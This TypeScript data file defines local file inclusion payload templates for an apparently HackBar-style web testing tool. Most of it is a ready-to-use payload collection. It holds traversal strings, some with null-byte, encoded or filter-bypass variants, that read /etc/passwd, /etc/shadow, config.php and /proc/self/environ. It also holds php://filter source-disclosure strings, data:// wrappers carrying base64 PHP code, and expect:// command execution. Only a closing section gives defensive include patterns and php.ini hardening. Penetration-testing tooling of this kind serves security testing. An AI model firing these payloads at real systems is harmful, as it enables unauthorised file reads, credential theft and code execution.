import { TemplateCategory } from '../../types/template';

export const lfiCategory: TemplateCategory = {
  id: 'lfi',
  label: 'LFI',
  description: 'Local File Inclusion (LFI), 50+ Path Traversal cheat sheet variations, PHP stream wrappers, and mitigation patterns',
  iconName: 'Folder',
  subcategories: [
    // ========================================================================
    // 1. LFI CHEAT SHEET 1 (Standard, Relative & Multi-Depth Traversal)
    // ========================================================================
    {
      id: 'lfi-cheat-sheet-1',
      label: 'LFI Cheat Sheet 1',
      description: 'Classic HackBar Path Traversal sequences: root absolute, multi-depth traversal, hosts, shadow, and null byte variations',
      templates: [
        {
          id: 'lfi-cs1-etc-passwd-abs',
          name: '/etc/passwd (Root Absolute)',
          description: 'Single leading slash root-anchored path',
          content: '/etc/passwd'
        },
        {
          id: 'lfi-cs1-etc-passwd-triple-slash',
          name: '///etc/passwd (Multiple Slashes)',
          description: 'Multiple leading slashes to test path prefix normalization',
          content: '///etc/passwd'
        },
        {
          id: 'lfi-cs1-etc-passwd-10-depth',
          name: '../../../../../../../../../../etc/passwd',
          description: '10-level directory traversal reaching filesystem root',
          content: '../../../../../../../../../../etc/passwd'
        },
        {
          id: 'lfi-cs1-etc-passwd-null',
          name: '/etc/passwd%00 (Absolute Null Byte)',
          description: 'Root absolute path terminated with URL-encoded null byte (PHP < 5.3.4)',
          content: '/etc/passwd%00'
        },
        {
          id: 'lfi-cs1-etc-passwd-10-depth-null',
          name: '../../../../../../../../../../etc/passwd%00',
          description: '10-level directory traversal with trailing null byte',
          content: '../../../../../../../../../../etc/passwd%00'
        },
        {
          id: 'lfi-cs1-etc-passwd-unc',
          name: '\\\\\\etc\\passwd (Windows UNC Path)',
          description: 'Leading backslash sequence for Windows path resolution',
          content: '\\\\\\etc\\passwd'
        },
        {
          id: 'lfi-cs1-etc-passwd-windows-depth',
          name: '..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd',
          description: 'Windows 9-level directory traversal using backslashes',
          content: '..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd'
        },
        {
          id: 'lfi-cs1-etc-passwd-windows-null',
          name: '\\etc\\passwd%00 (Windows Absolute Null)',
          description: 'Windows backslash path with trailing null byte',
          content: '\\etc\\passwd%00'
        },
        {
          id: 'lfi-cs1-etc-passwd-windows-depth-null',
          name: '..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd%00',
          description: 'Windows 9-level traversal with trailing null byte',
          content: '..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd%00'
        },
        {
          id: 'lfi-cs1-etc-passwd-double-slash',
          name: '//etc/passwd (Double Slash)',
          description: 'Double leading slash path resolution probe',
          content: '//etc/passwd'
        },
        {
          id: 'lfi-cs1-etc-passwd-dot-strip',
          name: '....//....//....//....//....//....//etc/passwd',
          description: 'Non-recursive filter bypass: stripping ../ leaves intact ../ sequences',
          content: '....//....//....//....//....//....//etc/passwd'
        },
        {
          id: 'lfi-cs1-etc-passwd-double-slash-null',
          name: '//etc/passwd%00 (Double Slash Null)',
          description: 'Double slash prefix with trailing null byte',
          content: '//etc/passwd%00'
        },
        {
          id: 'lfi-cs1-etc-passwd-dot-strip-null',
          name: '....//....//....//....//....//....//etc/passwd%00',
          description: 'Non-recursive filter bypass sequence with trailing null byte',
          content: '....//....//....//....//....//....//etc/passwd%00'
        },
        {
          id: 'lfi-cs1-etc-hosts-triple-slash',
          name: '///etc/hosts (Hosts File)',
          description: 'Triple leading slash probe targeting network hosts file',
          content: '///etc/hosts'
        },
        {
          id: 'lfi-cs1-etc-hosts-10-depth',
          name: '../../../../../../../../../../etc/hosts',
          description: '10-level directory traversal targeting hosts file',
          content: '../../../../../../../../../../etc/hosts'
        },
        {
          id: 'lfi-cs1-etc-hosts-null',
          name: '/etc/hosts%00 (Hosts Absolute Null)',
          description: 'Absolute hosts file path with trailing null byte',
          content: '/etc/hosts%00'
        },
        {
          id: 'lfi-cs1-etc-hosts-10-depth-null',
          name: '../../../../../../../../../../etc/hosts%00',
          description: '10-level directory traversal targeting hosts with null byte',
          content: '../../../../../../../../../../etc/hosts%00'
        },
        {
          id: 'lfi-cs1-etc-shadow-triple-slash',
          name: '///etc/shadow (Shadow File)',
          description: 'Triple leading slash probe targeting shadow password file',
          content: '///etc/shadow'
        },
        {
          id: 'lfi-cs1-etc-shadow-10-depth',
          name: '../../../../../../../../../../etc/shadow',
          description: '10-level directory traversal targeting shadow file',
          content: '../../../../../../../../../../etc/shadow'
        },
        {
          id: 'lfi-cs1-etc-shadow-null',
          name: '/etc/shadow%00 (Shadow Absolute Null)',
          description: 'Absolute shadow file path with trailing null byte',
          content: '/etc/shadow%00'
        },
        {
          id: 'lfi-cs1-etc-shadow-10-depth-null',
          name: '../../../../../../../../../../etc/shadow%00',
          description: '10-level directory traversal targeting shadow with null byte',
          content: '../../../../../../../../../../etc/shadow%00'
        },
        {
          id: 'lfi-cs1-etc-passwd-space-encoded',
          name: '..\\%20\\..\\%20\\..\\%20\\/etc/passwd%00',
          description: 'Space-encoded backslash traversal with null byte',
          content: '..\\%20\\..\\%20\\..\\%20\\/etc/passwd%00'
        },
        {
          id: 'lfi-cs1-etc-hosts-dot-strip',
          name: '....//....//....//....//....//....//etc/hosts',
          description: 'Non-recursive filter bypass sequence targeting hosts file',
          content: '....//....//....//....//....//....//etc/hosts'
        },
        {
          id: 'lfi-cs1-etc-hosts-dot-strip-null',
          name: '....//....//....//....//....//....//etc/hosts%00',
          description: 'Non-recursive filter bypass targeting hosts with null byte',
          content: '....//....//....//....//....//....//etc/hosts%00'
        },
        {
          id: 'lfi-cs1-etc-group-windows-null',
          name: '\\etc\\group%00 (Group Windows Null)',
          description: 'Windows backslash path targeting group file with null byte',
          content: '\\etc\\group%00'
        },
        {
          id: 'lfi-cs1-etc-group-windows-depth-null',
          name: '..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\group%00',
          description: 'Windows 9-level traversal targeting group with null byte',
          content: '..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\group%00'
        },
        {
          id: 'lfi-cs1-dot-encoded-traversal',
          name: '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
          description: 'URL-encoded dot (%2e%2e) traversal sequence',
          content: '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
        },
        {
          id: 'lfi-cs1-slash-encoded-traversal-null',
          name: '..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00',
          description: 'URL-encoded slash (%2f) traversal sequence with null byte',
          content: '..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00'
        }
      ]
    },

    // ========================================================================
    // 2. LFI CHEAT SHEET 2 (Obfuscated, Encoded, Config & Proc Traversal)
    // ========================================================================
    {
      id: 'lfi-cheat-sheet-2',
      label: 'LFI Cheat Sheet 2',
      description: 'Advanced HackBar traversal: caret truncation, interleaved nulls, double-encoded backslashes, config.php, and proc/self/environ',
      templates: [
        {
          id: 'lfi-cs2-etc-passwd-caret-null',
          name: '/../../../../../../../../../../etc/passwd^^%00',
          description: '10-level traversal with caret truncation marker and null byte',
          content: '/../../../../../../../../../../etc/passwd^^%00'
        },
        {
          id: 'lfi-cs2-etc-shadow-caret-null',
          name: '/../../../../../../../../../../etc/shadow^^%00',
          description: '10-level traversal targeting shadow with caret null byte',
          content: '/../../../../../../../../../../etc/shadow^^%00'
        },
        {
          id: 'lfi-cs2-etc-passwd-win-10-null',
          name: '..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd%00',
          description: '10-level Windows backslash traversal with null byte',
          content: '..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd%00'
        },
        {
          id: 'lfi-cs2-dot-slash-interleaved-passwd',
          name: '/././././././././././././././etc/passwd%00',
          description: 'Interleaved current-directory (./) normalization sequence with null byte',
          content: '/././././././././././././././etc/passwd%00'
        },
        {
          id: 'lfi-cs2-dot-slash-interleaved-shadow',
          name: '/././././././././././././././etc/shadow%00',
          description: 'Interleaved current-directory sequence targeting shadow with null byte',
          content: '/././././././././././././././etc/shadow%00'
        },
        {
          id: 'lfi-cs2-dot-slash-interleaved-group',
          name: '/././././././././././././././etc/group%00',
          description: 'Interleaved current-directory sequence targeting group with null byte',
          content: '/././././././././././././././etc/group%00'
        },
        {
          id: 'lfi-cs2-win-lead-backslash-null',
          name: '\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd%00',
          description: 'Leading backslash with 7-level traversal and null byte',
          content: '\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd%00'
        },
        {
          id: 'lfi-cs2-interleaved-null-slashes-passwd',
          name: '/%00//%00//%00//%00//%00//etc/passwd%00',
          description: 'Interleaved null byte slashes testing normalization parser bypass',
          content: '/%00//%00//%00//%00//%00//etc/passwd%00'
        },
        {
          id: 'lfi-cs2-interleaved-null-slashes-shadow',
          name: '/%00//%00//%00//%00//%00//etc/shadow%00',
          description: 'Interleaved null byte slashes targeting shadow file',
          content: '/%00//%00//%00//%00//%00//etc/shadow%00'
        },
        {
          id: 'lfi-cs2-interleaved-null-double-slash-shadow',
          name: '/%00//%00//%00//%00//%00//etc//shadow%00',
          description: 'Interleaved null bytes with double slash prefix targeting shadow',
          content: '/%00//%00//%00//%00//%00//etc//shadow%00'
        },
        {
          id: 'lfi-cs2-mixed-encoded-dot-backslash',
          name: '/%2e%2e\\../%2e%2e\\../%2e%2e\\../etc/passwd%00',
          description: 'Mixed dot-encoded (%2e%2e) and literal backslash traversal',
          content: '/%2e%2e\\../%2e%2e\\../%2e%2e\\../etc/passwd%00'
        },
        {
          id: 'lfi-cs2-double-encoded-backslash-passwd',
          name: '..%255c..%255c..%255c..%255cetc%255cpasswd%00',
          description: 'Double URL-encoded backslash (%255c) traversal sequence',
          content: '..%255c..%255c..%255c..%255cetc%255cpasswd%00'
        },
        {
          id: 'lfi-cs2-encoded-backslash-passwd',
          name: '..%5c..%5c..%5c..%5cetc%5cpasswd%00',
          description: 'Single URL-encoded backslash (%5c) traversal sequence',
          content: '..%5c..%5c..%5c..%5cetc%5cpasswd%00'
        },
        {
          id: 'lfi-cs2-encoded-backslash-mixed-slash',
          name: '..%5c..%5c..%5c..%5c/etc/passwd%00',
          description: 'Mixed encoded backslash and literal forward slash sequence',
          content: '..%5c..%5c..%5c..%5c/etc/passwd%00'
        },
        {
          id: 'lfi-cs2-encoded-backslash-group',
          name: '..%5c..%5c..%5c..%5cetc%5cgroup%00',
          description: 'Encoded backslash sequence targeting group file',
          content: '..%5c..%5c..%5c..%5cetc%5cgroup%00'
        },
        {
          id: 'lfi-cs2-encoded-backslash-shadow',
          name: '..%5c..%5c..%5c..%5cetc%5cshadow%00',
          description: 'Encoded backslash sequence targeting shadow file',
          content: '..%5c..%5c..%5c..%5cetc%5cshadow%00'
        },
        {
          id: 'lfi-cs2-config-double-slash-null',
          name: '..//..//..//..//config.php%00',
          description: 'Double slash relative traversal targeting config.php with null byte',
          content: '..//..//..//..//config.php%00'
        },
        {
          id: 'lfi-cs2-config-backslash-null',
          name: '..\\..\\..\\..\\config.php%00',
          description: 'Windows backslash relative traversal targeting config.php with null byte',
          content: '..\\..\\..\\..\\config.php%00'
        },
        {
          id: 'lfi-cs2-config-encoded-backslash-null',
          name: '..%5c..%5c..%5c..%5cconfig.php%00',
          description: 'Encoded backslash traversal targeting config.php with null byte',
          content: '..%5c..%5c..%5c..%5cconfig.php%00'
        },
        {
          id: 'lfi-cs2-config-triple-encoded-null',
          name: '..%25%35%63..%25%35%63..%25%35%63config.php%00',
          description: 'Triple-encoded percent backslash (%25%35%63) sequence',
          content: '..%25%35%63..%25%35%63..%25%35%63config.php%00'
        },
        {
          id: 'lfi-cs2-proc-environ-abs',
          name: '/proc/self/environ (Absolute)',
          description: 'Linux process environment pseudo-file root-anchored path',
          content: '/proc/self/environ'
        },
        {
          id: 'lfi-cs2-proc-environ-triple-slash',
          name: '///proc/self/environ (Multiple Slashes)',
          description: 'Multiple leading slashes targeting process environment file',
          content: '///proc/self/environ'
        },
        {
          id: 'lfi-cs2-proc-environ-relative',
          name: '../../proc/self/environ (Relative)',
          description: 'Short relative traversal targeting proc/self/environ',
          content: '../../proc/self/environ'
        },
        {
          id: 'lfi-cs2-proc-environ-abs-null',
          name: '/proc/self/environ%00 (Absolute Null)',
          description: 'Absolute process environment file path with null byte',
          content: '/proc/self/environ%00'
        },
        {
          id: 'lfi-cs2-proc-environ-10-depth',
          name: '../../../../../../../../../../proc/self/environ',
          description: '10-level directory traversal targeting proc/self/environ',
          content: '../../../../../../../../../../proc/self/environ'
        },
        {
          id: 'lfi-cs2-proc-environ-10-depth-null',
          name: '../../../../../../../../../../proc/self/environ%00',
          description: '10-level directory traversal targeting proc/self/environ with null byte',
          content: '../../../../../../../../../../proc/self/environ%00'
        }
      ]
    },

    // ========================================================================
    // 3. LFI FILTER (php://filter Stream)
    // ========================================================================
    {
      id: 'php-filter',
      label: 'LFI Filter (php://filter)',
      description: 'PHP conversion stream filters for source code disclosure without server execution',
      templates: [
        {
          id: 'lfi-filter-convert-base64',
          name: 'convert.base64-encode',
          description: 'Encodes resource content in base64 to read PHP source code without execution',
          content: 'php://filter/convert.base64-encode/resource={resource_file}',
          parameters: [
            { id: 'resource_file', label: 'Resource File', defaultValue: 'index.php', inputType: 'text' }
          ]
        },
        {
          id: 'lfi-filter-read-rot13',
          name: 'read=string.rot13',
          description: 'Applies ROT13 transformation filter on the read stream',
          content: 'php://filter/read=string.rot13/resource={resource_file}',
          parameters: [
            { id: 'resource_file', label: 'Resource File', defaultValue: 'index.php', inputType: 'text' }
          ]
        },
        {
          id: 'lfi-filter-zlib-deflate',
          name: 'zlib.deflate',
          description: 'Applies zlib compression deflation stream filter',
          content: 'php://filter/zlib.deflate/resource={resource_file}',
          parameters: [
            { id: 'resource_file', label: 'Resource File', defaultValue: 'index.php', inputType: 'text' }
          ]
        },
        {
          id: 'lfi-filter-read-toupper',
          name: 'read=string.toupper',
          description: 'Converts resource characters to uppercase during read operations',
          content: 'php://filter/read=string.toupper/resource={resource_file}',
          parameters: [
            { id: 'resource_file', label: 'Resource File', defaultValue: 'index.php', inputType: 'text' }
          ]
        },
        {
          id: 'lfi-filter-resource-direct',
          name: 'filter/resource=index.php',
          description: 'Direct resource specification without conversion filters',
          content: 'php://filter/resource={resource_file}',
          parameters: [
            { id: 'resource_file', label: 'Resource File', defaultValue: 'index.php', inputType: 'text' }
          ]
        }
      ]
    },

    // ========================================================================
    // 4. LFI WRAPPER (file://, php://, zip://, phar://)
    // ========================================================================
    {
      id: 'php-wrapper',
      label: 'LFI Wrapper',
      description: 'PHP built-in filesystem and archive protocol stream wrappers',
      templates: [
        {
          id: 'lfi-wrapper-file-uri',
          name: 'file:///etc/passwd',
          description: 'Explicit file protocol URI scheme resolving local filesystem paths',
          content: 'file:///etc/passwd'
        },
        {
          id: 'lfi-wrapper-php-input',
          name: 'php://input',
          description: 'Directs include() to read and execute raw HTTP POST body data (requires allow_url_include=On)',
          content: 'php://input'
        },
        {
          id: 'lfi-wrapper-zip-archive',
          name: 'zip://shell.zip%23shell/shell.jpg',
          description: 'Decompresses and extracts file from zip archive using URL-encoded hash fragment (# -> %23)',
          content: 'zip://{archive_path}%23{inner_file}',
          parameters: [
            { id: 'archive_path', label: 'Archive Path', defaultValue: 'shell.zip', inputType: 'text' },
            { id: 'inner_file', label: 'Inner File', defaultValue: 'shell/shell.jpg', inputType: 'text' }
          ]
        },
        {
          id: 'lfi-wrapper-phar-archive',
          name: 'phar://phartest.aaa%23testfile.txt',
          description: 'PHP Archive stream wrapper accessing serialized or packaged files',
          content: 'phar://{phar_path}%23{inner_file}',
          parameters: [
            { id: 'phar_path', label: 'PHAR Path', defaultValue: 'phartest.aaa', inputType: 'text' },
            { id: 'inner_file', label: 'Inner File', defaultValue: 'testfile.txt', inputType: 'text' }
          ]
        },
        {
          id: 'lfi-wrapper-php-temp',
          name: 'php://temp',
          description: 'Read/write memory stream storing data up to predefined memory limit before spooling to temp file',
          content: 'php://temp'
        }
      ]
    },

    // ========================================================================
    // 5. LFI DATA WRAPPER (data:// scheme)
    // ========================================================================
    {
      id: 'data-wrapper',
      label: 'LFI Data Wrapper',
      description: 'RFC 2397 inline data stream wrappers (requires allow_url_include=On)',
      templates: [
        {
          id: 'lfi-data-wrapper-get',
          name: 'Data Wrapper (GET / Plaintext)',
          description: 'Plaintext inline PHP code payload via data: URI scheme',
          content: 'data:text/plain,<?php phpinfo(); ?>'
        },
        {
          id: 'lfi-data-wrapper-post',
          name: 'Data Wrapper (POST / Form Data)',
          description: 'Data URI configured for testing POST form input parameters',
          content: 'data://text/plain;base64,PD9waHAgZWNobyAnTEZJX1RFU1RfT0snOyA/Pg=='
        },
        {
          id: 'lfi-data-wrapper-fgc',
          name: 'Data Wrapper (FILE_GET_CONTENTS)',
          description: 'Data stream formatted for testing file_get_contents retrieval routines',
          content: 'data:text/plain;base64,PD9waHAgZWNobyAnRkdDX09LTic7ID8+'
        },
        {
          id: 'lfi-data-wrapper-phpinfo',
          name: 'Data Wrapper (PHPINFO Base64)',
          description: 'Base64 encoded phpinfo() diagnostic payload via data stream wrapper',
          content: 'data:text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=='
        }
      ]
    },

    // ========================================================================
    // 6. RFI & EXPECT WRAPPERS
    // ========================================================================
    {
      id: 'rfi-expect',
      label: 'RFI & Expect Wrappers',
      description: 'Remote File Inclusion placeholders and expect:// stream execution directives',
      templates: [
        {
          id: 'rfi-wrapper-expect-id',
          name: 'RFI Wrapper EXPECT (id)',
          description: 'Executes command via PHP expect PECL extension stream (expect://id)',
          content: 'expect://id'
        },
        {
          id: 'rfi-wrapper-expect-ls',
          name: 'RFI Wrapper EXPECT (ls)',
          description: 'Lists directory via PHP expect PECL extension stream (expect://ls)',
          content: 'expect://ls'
        },
        {
          id: 'rfi-localhost-placeholder',
          name: 'RFI Localhost Fixture URL',
          description: 'Conceptual lab fixture URL demonstrating remote resource inclusion syntax',
          content: 'http://127.0.0.1:8080/fixtures/{fixture_file}',
          parameters: [
            { id: 'fixture_file', label: 'Fixture Name', defaultValue: 'sample.txt', inputType: 'text' }
          ]
        },
        {
          id: 'rfi-stream-wrapper-check',
          name: 'PHP stream_get_wrappers() Snippet',
          description: 'Inspects registered stream wrappers supported by the target server runtime',
          content: '<?php print_r(stream_get_wrappers()); ?>'
        }
      ]
    },

    // ========================================================================
    // 7. LFI MITIGATION & DEFENSIVE PATTERNS
    // ========================================================================
    {
      id: 'lfi-mitigation',
      label: 'LFI Mitigation & Defensive',
      description: 'Defensive PHP implementation patterns, path sanitization, and runtime configuration hardening',
      templates: [
        {
          id: 'lfi-mitigation-whitelist',
          name: 'Whitelist-Based File Selection',
          description: 'Gold standard: strict mapping between input keys and hardcoded filesystem paths',
          content: '$allowed = [\'home\' => \'pages/home.php\', \'contact\' => \'pages/contact.php\'];\n$page = $allowed[$_GET[\'page\'] ?? \'home\'] ?? $allowed[\'home\'];\ninclude $page;'
        },
        {
          id: 'lfi-mitigation-basename',
          name: 'basename() Input Sanitization',
          description: 'Strips directory traversal separators (../ and ..\\), restricting inclusion to immediate folder',
          content: '$file = basename($_GET[\'page\']);\ninclude \'pages/\' . $file;'
        },
        {
          id: 'lfi-mitigation-realpath',
          name: 'realpath() Boundary Verification',
          description: 'Canonicalizes path using realpath() and verifies target resides strictly within allowed base directory',
          content: '$base = realpath(\'/var/www/html/pages/\');\n$target = realpath($base . \'/\' . $_GET[\'page\']);\nif ($target && strpos($target, $base) === 0 && file_exists($target)) {\n    include $target;\n} else {\n    http_response_code(404);\n}'
        },
        {
          id: 'lfi-mitigation-array-mapping',
          name: 'Safe Include Switch Mapping',
          description: 'Explicit switch statement mapping input values to predetermined source files',
          content: 'switch ($_GET[\'view\'] ?? \'\') {\n    case \'profile\': include \'views/profile.php\'; break;\n    case \'dashboard\': include \'views/dashboard.php\'; break;\n    default: include \'views/default.php\'; break;\n}'
        },
        {
          id: 'lfi-mitigation-php-ini',
          name: 'php.ini Configuration Hardening',
          description: 'Recommended security directives in php.ini to mitigate file inclusion vectors at runtime',
          content: '; php.ini Hardening Guidelines\nallow_url_fopen = Off\nallow_url_include = Off\nopen_basedir = /var/www/html/;/tmp/\ndisplay_errors = Off\nlog_errors = On'
        }
      ]
    }
  ]
};
